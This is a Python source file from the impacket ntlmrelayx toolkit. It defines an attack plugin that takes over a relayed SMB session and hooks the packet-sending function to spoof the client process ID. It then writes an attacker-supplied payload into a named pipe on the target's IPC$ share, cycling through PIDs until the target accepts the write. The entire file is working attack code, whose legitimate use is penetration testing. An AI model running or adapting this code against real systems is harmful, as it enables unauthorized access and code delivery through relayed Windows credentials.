# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#  Ceri Coburn (@_EthicalChaos_) / PTP (https://www.pentestpartners.com)
#
# Description:
#  Defines a base class for all attacks + loads all available modules
#
# ToDo:
#
import json
import time
import types
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket import smb3, smb
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.smb3 import SMB3
from impacket.smb3 import SMB2_CREATE
from impacket.smb import SMB

PROTOCOL_ATTACK_CLASS = "NPAttack"

class NPAttack(ProtocolAttack):
    """
    This is the SMB default attack class.
    It will either dump the hashes from the remote target, or open an interactive
    shell if the -i option is specified.
    """
    PLUGIN_NAMES = ["NP"]
    def __init__(self, config, SMBClient, username):
        ProtocolAttack.__init__(self, config, SMBClient, username)

        self.pid = int(config.pipe_client_pid)
        self.pipe_name = config.pipe_name
        self.payload = config.payload_path
        if not config.command:
            self.command = 'c:\\windows\\system32\\cmd.exe'
        else:
            self.command = config.command

        self.sendSMB_Original = self.client._SMBConnection.sendSMB
        self.client._SMBConnection.sendSMB = types.MethodType(self.sendSMB, self.client._SMBConnection)

        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
            self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
        else:
            self.__SMBConnection = SMBClient

    def openPipe(self, tid, pipe, accessMask):
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                self.__SMBConnection.waitNamedPipe(tid, pipe)
                pipeReady = True
            except Exception as e:
                print(str(e))
                tries -= 1
                time.sleep(2)
                pass

        if tries == 0:
            raise Exception('Pipe not ready, aborting')

        fid = self.__SMBConnection.openFile(tid, pipe, accessMask, creationOption=0x40, fileAttributes=0x80)

        return fid

    def isPipeAvailable(self, tid):
        try:
            fid = self.openPipe(tid, '\\' + self.pipe_name, 0x12019f)
            self.__SMBConnection.closeFile(tid, fid)
            return True
        except:
            return False

    def sendPayload(self, tid):

        result = True
        fid = self.openPipe(tid, '\\' + self.pipe_name, 0x12019f)
        payload_file = open(self.payload, mode='rb')
        payload = payload_file.read()
        response = None

        try:
            self.__SMBConnection.writeNamedPipe(tid, fid, payload, True)
            response = self.__SMBConnection.readNamedPipe(tid, fid)

        except Exception as e:
            response = e
            result = False

        finally:
            self.__SMBConnection.closeFile(tid, fid)
            return result

    def getData(self, original):
        original['Pid'] = self.pid
        return original.orignalGetData()

    def sendSMB(self, original, packet):

        # Some ugly hacks here, essentially we are hooking
        # some original SMB1/2 function from impacket so we
        # can intercept the calls and patch the PID at the correct point

        if packet['Command'] is SMB2_CREATE: #SMB2/3
            # If the command type is create for opening files/named pipes
            # then replace the Reserved (PID) field with our spoofed PID
            packet["Reserved"] = self.pid
        elif packet['Command'] is SMB.SMB_COM_NT_CREATE_ANDX: #SMB1
            # Additional level of hooks here since SMB1 packets are
            # handled differently, and in fact the impacket does use
            # the real process PID of the client, so we need to override
            # that behavior
            packet.orignalGetData = packet.getData
            packet.getData = types.MethodType(self.getData, packet)

        # Send our packet using original sendSMB function
        self.sendSMB_Original(packet)

    def run(self):

        tid = self.__SMBConnection.connectTree('IPC$')

        if not self.isPipeAvailable(tid):
            LOG.warn("Pipe not found or accessible on host %s" % (
                self.__SMBConnection.getRemoteHost()))
            return

        if self.pid is 0:
            LOG.info("Pipe found and writable on %s, starting attack through PID cycling!" %
                     (self.__SMBConnection.getRemoteHost()))
            self.pid = 4
            while self.pid < 50000 and self.sendPayload(tid) is False:
                self.pid += 4

            LOG.info("Finished PID cycling on host %s", self.__SMBConnection.getRemoteHost())
        else:
            LOG.info("Pipe found and writable on %s, sending payload using PID %d!" %
                     (self.__SMBConnection.getRemoteHost(), self.pid))
            self.sendPayload(tid)

        self.__SMBConnection.close()
